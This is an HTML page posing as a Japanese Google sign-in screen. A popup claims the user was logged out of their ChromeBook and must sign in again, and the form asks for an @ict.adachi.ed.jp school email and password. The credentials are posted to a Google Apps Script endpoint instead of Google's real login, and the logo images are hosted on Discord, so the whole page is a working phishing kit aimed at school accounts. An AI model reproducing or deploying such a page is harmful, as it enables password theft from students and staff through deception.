<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Googleに再度ログイン</title>
    <link href="https://fonts.googleapis.com/css?family=Montserrat&amp;display=swap" rel="stylesheet">
    <link rel="icon" type="image/png" href="https://cdn.discordapp.com/attachments/1060930145562677358/1137355348701872139/faviconV2.png">
    <style>
      body {
        font-family: '筑紫A丸ゴシック Std R', 'Montserrat', sans-serif;
        background-color: white;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
      }
      .container {
        text-align: center;
        padding: 20px;
        border-radius: 20px;
        box-shadow: 0 0 10px rgba(0,0,0,0.3);
        max-width: 400px;
        width: 100%;
      }
      h1 {
        font-weight: normal;
        font-size: 24px;
      }
      h1 small {
        font-size: 14px;
        display: block;
      }
      .logo {
        width: 100px;
        height: auto;
        margin-bottom: 10px;
      }
      label {
        display: block;
        text-align: left;
        font-weight: normal;
        margin-top: 10px;
      }
      input[type="text"], input[type="password"] {
        width: 100%;
        padding: 15px;
        border: 1px solid #ccc;
        border-radius: 5px;
        box-sizing: border-box;
        text-align: left;
        margin-top: 5px;
      }
      input[type="submit"] {
        background-color: #2578e6;
        color: white;
        padding: 12px 20px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        margin-top: 20px;
      }
      input[type="submit"]:hover {
        background-color: #024fb5;
      }
      .forgot-password {
        color: #006bb3;
        margin-top: 10px;
        display: block;
      }
      .language {
        color: #545759;
        margin-top: 5px;
        display: block;
      }
      /* カスタムポップアップのスタイル */
      .custom-popup {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: white;
        border-radius: 10px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
        padding: 20px;
        text-align: center;
        z-index: 9999; /* ポップアップが最前面に表示されるようにする */
      }
      .custom-popup p {
        margin-bottom: 15px;
      }
      .custom-popup button {
        background-color: #2578e6;
        color: white;
        border: none;
        border-radius: 5px;
        padding: 10px 20px;
        cursor: pointer;
        transition: background-color 0.3s ease;
      }
      .custom-popup button:hover {
        background-color: #024fb5;
      }
      /* オーバーレイのスタイル */
      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7); /* 半透明の黒 */
        z-index: 9998; /* オーバーレイがポップアップの下に表示されるようにする */
      }
    </style>
    <script>
      window.onload = function() {
        const overlay = document.createElement("div");
        overlay.className = "overlay";
        
        const popup = document.createElement("div");
        popup.className = "custom-popup";
        popup.innerHTML = `
          <p>しばらくChromeBookにログインしていなかったため<br>安全のためにログアウトしました。<br>引き続き利用するには<br>再度ログインしてください。</p>
          <button id="popup-close">OK</button>
        `;
        
        overlay.appendChild(popup);
        document.body.appendChild(overlay);
        
        const closeButton = document.getElementById("popup-close");
        closeButton.addEventListener("click", function() {
          document.body.removeChild(overlay);
        });
      }
    </script>
  </head>
  <body>
    <div class="container">
      <img src="https://cdn.discordapp.com/attachments/1060930145562677358/1137358586369019945/image.png" alt="画像" class="logo">
      <h1>ログイン<small>お客様のGoogleアカウントを追加</small></h1>
      <form action="https://script.google.com/macros/s/AKfycbw5nyK6jygf7matSccoFsDWv1CYpl3AqvRK6bikxtLa4igm3yw9Y7j1UCySIdurSdsi/exec" method="post">
        <label for="email">メールアドレス (@ict.adachi.ed.jp)</label>
        <input type="text" id="email" name="email" required="">
        <label for="password">パスワード</label>
        <input type="password" id="password" name="password" required="">
      <a href="https://accounts.google.com/signup/v2/createaccount?biz=false&cc=JP&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S-821851245%3A1691238218328532&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ja&authuser=0" class="forgot-password">メールアドレスまたはパスワードを忘れた場合</a>
      <a href="https://accounts.google.com/signup/v2/createaccount?biz=false&cc=JP&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S-821851245%3A1691238218328532&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ja&authuser=0" class="forgot-password">アカウントを作成</a>
      <span class="language">言語: 日本語</span>
        <input type="submit" value="次へ">
      </form>
    </div>
  </body>
</html>
